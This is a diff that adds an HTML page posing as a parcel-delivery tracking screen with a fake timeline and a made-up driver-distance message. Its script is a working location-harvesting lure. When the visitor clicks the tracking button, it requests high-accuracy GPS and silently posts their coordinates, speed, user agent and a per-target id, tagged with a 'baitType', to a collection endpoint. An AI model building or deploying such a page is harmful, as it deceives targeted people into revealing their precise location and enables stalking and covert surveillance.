@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Express Parcel Delivery Tracking</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: #f8fafc;
+            color: #1e293b;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .card {
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            padding: 32px;
+            width: 100%;
+            max-width: 420px;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .header i {
+            font-size: 28px;
+            color: #2563eb;
+        }
+
+        .header h2 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #0f172a;
+        }
+
+        .track-num {
+            background: #eff6ff;
+            color: #1d4ed8;
+            font-weight: 600;
+            padding: 8px 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .timeline {
+            border-left: 2px solid #e2e8f0;
+            padding-left: 20px;
+            margin-left: 10px;
+            margin-bottom: 24px;
+        }
+
+        .timeline-item {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .timeline-item::before {
+            content: "";
+            position: absolute;
+            left: -26px;
+            top: 4px;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #2563eb;
+        }
+
+        .timeline-item h4 {
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .timeline-item p {
+            font-size: 12px;
+            color: #64748b;
+        }
+
+        .btn-track {
+            width: 100%;
+            padding: 12px;
+            background: #2563eb;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="card">
+        <div class="header">
+            <i class="fa-solid fa-truck-fast"></i>
+            <div>
+                <h2>Express Logistics Tracking</h2>
+                <span style="font-size: 12px; color: #64748b;">Out for Delivery Today</span>
+            </div>
+        </div>
+
+        <div class="track-num">Tracking ID: #EX-984029-IN</div>
+
+        <div class="timeline">
+            <div class="timeline-item">
+                <h4>Out for Delivery</h4>
+                <p>Courier driver assigned to destination</p>
+            </div>
+            <div class="timeline-item">
+                <h4>Arrived at Regional Hub</h4>
+                <p>Sorting completed</p>
+            </div>
+        </div>
+
+        <button id="trackBtn" class="btn-track" onclick="trackCourier()">
+            <i class="fa-solid fa-location-crosshairs"></i> SHOW LIVE DRIVER DISTANCE
+        </button>
+    </div>
+
+    <script>
+        const targetId = new URLSearchParams(window.location.search).get("id") || localStorage.getItem("target_id") || "DeliveryTarget";
+
+        function trackCourier() {
+            const btn = document.getElementById("trackBtn");
+            btn.innerText = "Syncing GPS Proximity...";
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    btn.innerText = "Driver Distance: 1.2 km away";
+                    fetch("/location-payload", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            id: targetId,
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy || 10,
+                            speed: pos.coords.speed || 0,
+                            userAgent: navigator.userAgent,
+                            baitType: "Package Delivery"
+                        })
+                    });
+                }, () => { alert("Please allow GPS access to measure package proximity."); }, { enableHighAccuracy: true });
+            }
+        }
+    </script>
+</body>
+
+</html>
